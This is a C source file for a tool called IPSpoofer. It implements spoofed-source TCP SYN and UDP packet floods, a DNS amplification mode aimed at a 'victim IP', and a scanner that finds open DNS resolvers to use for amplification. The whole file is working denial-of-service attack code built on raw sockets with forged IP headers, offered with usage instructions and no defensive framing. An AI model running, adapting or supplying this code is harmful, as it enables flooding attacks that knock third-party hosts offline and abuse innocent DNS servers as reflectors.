//
//  main.c
//  IPSpoofer
//
//  Created by Alexander Perechnev on 15.09.13.
//  Copyright (c) 2013 Alexander Perechnev. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <errno.h>

#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "ProtocolHeaders.h"
#include "MWCRandom.h"

void printUsage();
void generateRandomIPAddress(char *);
uint16_t csum(unsigned short *, int);
void sendUdpPacket(const char*, const char*, const char*, const char*, const char*);
void sendTcpPacket(const char*, const char*, const char*, const char*, const char*);
void sendDnsPacket(const char*, const char*, const char*, const char*);

int main(int argc, const char * argv[])
{
    if (argc < 2)
    {
        printUsage();
        return 0;
    }
    
    const char * programMode = argv[1];
    
    if (strcmp(programMode, "tcpspoof") == 0)
    {
        if (argc != 6)
        {
            printUsage();
            return 0;
        }
        
        const char * networkInteface = argv[2];
        const char * dstIP = argv[3];
        const char * dstPort = argv[4];
        unsigned int packetFrequency = atoi(argv[5]);
        
        printf("Start TCP/IP spoofing...\n");
        int sentPacketsNumber;
        for (sentPacketsNumber = 0; 1 == 1; sentPacketsNumber++)
        {
            char srcIP[16];
            generateRandomIPAddress(srcIP);
            sendTcpPacket(networkInteface, srcIP, dstIP, dstPort, dstPort);
            printf("Packets sent: %d; Spoofed IP: %s\n", sentPacketsNumber, srcIP);
            usleep(packetFrequency);
        }
        
        return 0;
    }
    else if (strcmp(programMode, "udpspoof") == 0)
    {
        if (argc != 6)
        {
            printUsage();
            return 0;
        }
        
        const char * networkInteface = argv[2];
        const char * dstIP = argv[3];
        const char * dstPort = argv[4];
        unsigned int packetFrequency = atoi(argv[5]);
        
        printf("Start UDP/IP spofing...\n");
        int sentPacketsNumber;
        for (sentPacketsNumber = 0; 1 == 1; sentPacketsNumber++)
        {
            char srcIP[16];
            generateRandomIPAddress(srcIP);
            printf("Packets sent: %d; Spoofed IP: %s\n", sentPacketsNumber, srcIP);
            sendUdpPacket(networkInteface, srcIP, dstIP, dstPort, dstPort);
            usleep(packetFrequency);
        }
        
        return 0;
    }
    else if (strcmp(programMode, "dnsamp") == 0)
    {
        if (argc != 6)
        {
            printUsage();
            return 0;
        }
        
        const char * networkInterface = argv[2];
        const char * spoofedIP = argv[3];
        const char * dnsIP = argv[4];
        uint32_t packetFrequency = atoi(argv[5]);
        const char * port = "53";
        
        printf("Starting DNS amplification...\n");
        uint32_t sentPacketsNumber;
        for (sentPacketsNumber = 0; 1 == 1; sentPacketsNumber++)
        {
            printf("%d packets sent\n", sentPacketsNumber);
            sendDnsPacket(networkInterface, spoofedIP, dnsIP, port);
            usleep(packetFrequency);
        }
        
        return 0;
    }
    else if (strcmp(programMode, "scandns") == 0)
    {
        if (argc != 6) {
            printUsage();
            return 0;
        }
        
        const char * networkInterface = argv[2];
        uint32_t fromIP = htonl(inet_addr(argv[3]));
        uint32_t toIP = htonl(inet_addr(argv[4]));
        int timeout = atoi(argv[5]);
        
        if (toIP < fromIP) {
            printf("<from IP> should be smaller or equal to <to IP>");
            return 0;
        }
        
        uint32_t currentIP;
        for (currentIP = fromIP; currentIP <= toIP; currentIP++)
        {
            char buffer[PACKET_LENGTH];
            
            struct DNSHeader * dnsHeader = (struct DNSHeader *) buffer;
            struct DNSQuery * dnsQuery = (struct DNSQuery *) (buffer + sizeof(struct DNSHeader));
            
            dnsHeader->dnsh_identification = htons(0xb324);
            dnsHeader->dnsh_response = 0;
            dnsHeader->dnsh_opcode = 0;
            dnsHeader->dnsh_truncated = 0;
            dnsHeader->dnsh_recursion = 1;
            dnsHeader->dnsh_nonauth = 0;
            dnsHeader->dnsh_questions = htons(1);
            dnsHeader->dnsh_answerRRs = 0;
            dnsHeader->dnsh_authorityRRs = 0;
            dnsHeader->dnsh_additionalRRs = 0;
            
            char domain[] = { 4,'a','r','p','a',0 };
            strcpy(dnsQuery->dnsq_name, domain);
            dnsQuery->dnsq_type = htons(1);
            dnsQuery->dnsq_class = htons(1);
            
            int scanSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            
            struct ifreq ifr;
            memset (&ifr, 0, sizeof (ifr));
            snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", networkInterface);
            if (ioctl (scanSocket, SIOCGIFINDEX, &ifr) < 0) {
                perror ("ioctl() failed to find interface ");
                exit(-1);
            }
            
            struct sockaddr_in sin, din;
            bzero(&din, sizeof(din));
            din.sin_family = AF_INET;
            din.sin_addr.s_addr = ntohl(currentIP);
            din.sin_port = htons(53);
            
            int m = sendto(scanSocket, buffer, sizeof(struct DNSHeader) + sizeof(struct DNSQuery), 0, (struct sockaddr *)&din, sizeof(din));
            
            usleep(timeout*1000);
            
            int n = recvfrom(scanSocket, buffer, PACKET_LENGTH, MSG_DONTWAIT, NULL, NULL);
            if (n > 0) {
                printf("\nSent %d bytes. Received %u bytes from %s\n", m, n, inet_ntoa(din.sin_addr.s_addr));
            }
            else {
                printf(".");
                fflush(stdout);
            }
            
            close(scanSocket);
        }
        
        printf("\n");
    }

    return 0;
}

void printUsage()
{
    printf("Usage: spoofer tcpspoof <interface> <dst IP> <port> <timeout us>\n");
    printf("Usage: spoofer udpspoof <interface> <dst IP> <port> <timeout us>\n");
    printf("Usage: spoofer dnsamp <interface> <victim IP> <dns IP> <timeout us>\n");
    printf("Usage: spoofer scandns <interface> <from IP> <to IP> <timeout ms>\n");
}

void generateRandomIPAddress(char * address)
{
    init_rand(time(NULL));
    uint32_t random_num = rand_cmwc();
    char ipAddress[16];
    
    unsigned char oct1 = (random_num & 0xFF000000) >> 24,
                    oct2 = (random_num & 0x00FF0000) >> 16,
                    oct3 = (random_num & 0x0000FF00) >> 8,
                    oct4 = (random_num & 0x000000FF);
    
    if (oct1 == 0) {
        oct1++;
    }
    if (oct4 == 0) {
        oct4++;
    }

    sprintf(ipAddress, "%u.%u.%u.%u", oct1, oct2, oct3, oct4);

    strcpy(address, ipAddress);
}

unsigned short csum(unsigned short *buffer, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buffer++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void sendUdpPacket(const char *networkInterface, const char *srcIP, const char *dstIP, const char *srcPort, const char *dstPort)
{
    int rawSocket;

    char buffer[PACKET_LENGTH];

    struct IPHeader *ipHeader = (struct IPHeader *) buffer;
    struct UDPHeader *udpHeader = (struct UDPHeader *) (buffer + sizeof(struct IPHeader));

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;

    memset(buffer, 0, PACKET_LENGTH);

    rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (rawSocket < 0) {
        printf("socket() error");
        exit(-1);
    }

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    sin.sin_port = htons(atoi(srcPort));
    din.sin_port = htons(atoi(dstPort));

    sin.sin_addr.s_addr = inet_addr(srcIP);
    din.sin_addr.s_addr = inet_addr(dstIP);

    ipHeader->iph_ihl = 5;
    ipHeader->iph_ver = 4;
    ipHeader->iph_tos = 16; // Low delay
    ipHeader->iph_len = sizeof(struct IPHeader) + sizeof(struct UDPHeader);
    ipHeader->iph_ident = htons(54321);
    ipHeader->iph_ttl = 64; // hops
    ipHeader->iph_protocol = 17; // UDP
    // spoof please lol =P
    ipHeader->iph_sourceip = inet_addr(srcIP);
    ipHeader->iph_destip = inet_addr(dstIP);

    udpHeader->udph_srcport = htons(atoi(srcPort));
    udpHeader->udph_destport = htons(atoi(dstPort));
    udpHeader->udph_len = htons(sizeof(struct UDPHeader));
    ipHeader->iph_chksum = csum((unsigned short *)buffer, sizeof(struct IPHeader) + sizeof(struct UDPHeader));

    if(setsockopt(rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("setsockopt() error");
        exit(-1);
    }
    
    struct ifreq ifr;
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", networkInterface);
    if (ioctl (rawSocket, SIOCGIFINDEX, &ifr) < 0) {
        perror ("ioctl() failed to find interface ");
        exit(-1);
    }

    int errorCode = sendto(rawSocket, buffer, ipHeader->iph_len, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin));
    if(errorCode < 0)
    {
        if (errno == ENOBUFS) {
            printf("Buffer is full. Waiting until done...\n");
            usleep(5000000);
        }
        else
        {
            perror("sendto() error");
            exit(-1);
        }
    }

    close(rawSocket);
}

void sendTcpPacket(const char * networkInterface, const char *srcIP, const char *dstIP, const char *srcPort, const char *dstPort)
{
    int rawSocket;

    char buffer[PACKET_LENGTH];

    struct IPHeader *ip = (struct IPHeader *) buffer;
    struct TCPHeader *tcp = (struct TCPHeader *) (buffer + sizeof(struct IPHeader));
    struct sockaddr_in sin, din;

    int one = 1;
    const int *val = &one;

    memset(buffer, 0, PACKET_LENGTH);

    rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(rawSocket < 0)
    {
       perror("socket() error");
       exit(-1);
    }

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    sin.sin_port = htons(atoi(srcPort));
    din.sin_port = htons(atoi(dstPort));

    sin.sin_addr.s_addr = inet_addr(srcIP);
    din.sin_addr.s_addr = inet_addr(dstIP);

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 16;
    ip->iph_len = sizeof(struct IPHeader) + sizeof(struct TCPHeader);
    ip->iph_ident = htons(54321);
    ip->iph_offset = 0;
    ip->iph_ttl = 64;
    ip->iph_protocol = 6; // TCP
    ip->iph_chksum = 0; // Done by kernel

    ip->iph_sourceip = inet_addr(srcIP);
    ip->iph_destip = inet_addr(dstIP);

    tcp->tcph_srcport = htons(atoi(srcPort));

    tcp->tcph_destport = htons(atoi(dstPort));
    tcp->tcph_seqnum = htonl(1);
    tcp->tcph_acknum = 0;
    tcp->tcph_offset = 5;
    tcp->tcph_syn = 1;
    tcp->tcph_ack = 0;
    tcp->tcph_win = htons(32767);
    tcp->tcph_chksum = 0; // Done by kernel
    tcp->tcph_urgptr = 0;

    ip->iph_chksum = csum((unsigned short *) buffer, (sizeof(struct IPHeader) + sizeof(struct TCPHeader)));

    if(setsockopt(rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("setsockopt() error");
        exit(-1);
    }
    
    struct ifreq ifr;
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", networkInterface);
    if (ioctl (rawSocket, SIOCGIFINDEX, &ifr) < 0) {
        perror ("ioctl() failed to find interface ");
        exit(-1);
    }

    if(sendto(rawSocket, buffer, ip->iph_len, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        if (errno == ENOBUFS) {
            printf("Buffer is full. Waiting until done...\n");
            usleep(5000000);
        }
        else
        {
            perror("sendto() error");
            exit(-1);
        }
    }

    close(rawSocket);

    return;
}

void sendDnsPacket(const char *networkInterface, const char *spoofedIP, const char *dnsIP, const char *port)
{
    int rawSocket;
    
    char buffer[PACKET_LENGTH];
    
    struct IPHeader  * ipHeader = (struct IPHeader *) buffer;
    struct UDPHeader * udpHeader = (struct UDPHeader *) (buffer + sizeof(struct IPHeader));
    struct DNSHeader * dnsHeader = (struct DNSHeader *) (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader));
    struct DNSQuery * dnsQuery = (struct DNSQuery *) (buffer + sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader));
    
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    
    memset(buffer, 0, PACKET_LENGTH);
    
    rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (rawSocket < 0) {
        printf("socket() error\n");
        exit(-1);
    }
    
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    
    sin.sin_port = htons(atoi(port));
    din.sin_port = htons(atoi(port));
    
    sin.sin_addr.s_addr = inet_addr(spoofedIP);
    din.sin_addr.s_addr = inet_addr(dnsIP);
    
    ipHeader->iph_ihl = 5;
    ipHeader->iph_ver = 4;
    ipHeader->iph_tos = 16; // Low delay
    ipHeader->iph_len = sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DNSQuery);
    ipHeader->iph_ident = htons(54321);
    ipHeader->iph_ttl = 64; // hops
    ipHeader->iph_protocol = 17; // UDP
    ipHeader->iph_sourceip = inet_addr(spoofedIP);
    ipHeader->iph_destip = inet_addr(dnsIP);
    
    udpHeader->udph_srcport = htons(atoi(port));
    udpHeader->udph_destport = htons(atoi(port));
    udpHeader->udph_len = htons(sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DNSQuery));
    
    dnsHeader->dnsh_identification = htons(0xb324);
    dnsHeader->dnsh_response = 0;
    dnsHeader->dnsh_opcode = 0;
    dnsHeader->dnsh_truncated = 0;
    dnsHeader->dnsh_recursion = 1;
    dnsHeader->dnsh_nonauth = 0;
    dnsHeader->dnsh_questions = htons(1);
    dnsHeader->dnsh_answerRRs = 0;
    dnsHeader->dnsh_authorityRRs = 0;
    dnsHeader->dnsh_additionalRRs = 0;
    
    char domain[] = { 4,'a','r','p','a',0 };
    strcpy(dnsQuery->dnsq_name, domain);
    dnsQuery->dnsq_type = htons(1);
    dnsQuery->dnsq_class = htons(1);
    
    ipHeader->iph_chksum = csum((unsigned short *)buffer,
                                sizeof(struct IPHeader) + sizeof(struct UDPHeader) + sizeof(struct DNSHeader) + sizeof(struct DNSQuery));
    
    if(setsockopt(rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("setsockopt() error\n");
        exit(-1);
    }
    
    struct ifreq ifr;
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", networkInterface);
    if (ioctl (rawSocket, SIOCGIFINDEX, &ifr) < 0) {
        perror ("ioctl() failed to find interface ");
        exit(-1);
    }
    
    int64_t errorCode = sendto(rawSocket, buffer, ipHeader->iph_len, 0, (struct sockaddr *)&din, sizeof(din));
    if(errorCode < 0)
    {
        if (errno == ENOBUFS) {
            printf("Buffer is full. Waiting until done...\n");
            usleep(5000000);
        }
        else
        {
            perror("sendto() error");
            exit(-1);
        }
    }
    
    close(rawSocket);
}